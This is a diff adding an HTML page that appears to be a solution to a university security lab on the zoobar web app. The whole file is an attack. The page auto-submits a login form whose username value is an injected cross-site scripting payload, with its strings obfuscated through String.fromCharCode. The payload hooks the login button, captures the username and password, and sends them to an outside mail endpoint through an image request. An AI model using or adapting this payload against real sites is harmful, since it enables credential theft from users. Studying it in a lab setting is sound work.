@@ -1,0 +1,56 @@
+<html>
+<head>
+</head>
+<body>
+
+<form name=loginform method="post"  id="lform" action="http://zoobar.org/index.php">
+<table>
+<tr>
+   <td>Username:</td>
+  <td><input type=text name=login_username size=25 autocomplete=no ></td>
+</tr>
+<tr>
+   <td>Password:</td>
+  <td colspan=2><input type=password name=login_password size=25 autocomplete=no>
+  <input type=submit name=submit_login value="Log in">
+  <input type=submit name=submit_registration value="Register"></td>
+</tr>
+</table>
+</form>
+
+<script type="text/javascript">
+    // Convert the given string to the String.fromCharCode representation of that string
+    function get_str(s) {
+        var out = "String.fromCharCode(";
+        for(var i = 0; i < s.length; i++) {
+            out += s.charCodeAt(i) + ",";
+        }
+        out = out.slice(0,-1);
+        out += ")";
+        return out;
+    }
+
+    var uname = document.getElementsByName("login_username")[0];
+    uname.value = "'' \
+onfocus=' \
+var pfunc = function (e) { \
+e.preventDefault(); \
+var name = document.getElementsByName(" + get_str("login_username") + ")[0]; \
+var pass = document.getElementsByName(" + get_str("login_password") + ")[0]; \
+var src_str =" + get_str("http://zoomail.org/sendmail.php?") + " + " + get_str("&netid=cse127fai") + " + " + get_str("&payload=") + " + name.value + " + get_str(",") + " + pass.value + " + get_str("&random=" + Math.random()) + "; \
+var lbutton = document.getElementsByName(" + get_str("submit_login") + ")[0]; \
+lbutton.removeEventListener(" + get_str("click") + ", pfunc, false); \
+var email_img = new Image().src=src_str; \
+email_img.add_eventListener(" + get_str("error") + ", lbutton.click() , false); \
+}; \
+var lb = document.getElementsByName(" + get_str("submit_login") + " )[0];\
+lb.addEventListener(" + get_str("click") + ", pfunc , false); \
+var u=document.getElementsByName(" + get_str("login_username") + ")[0]; ' ";
+
+    var f = document.getElementById("lform");
+    f.submit();
+</script>
+
+</body>
+</html>
+
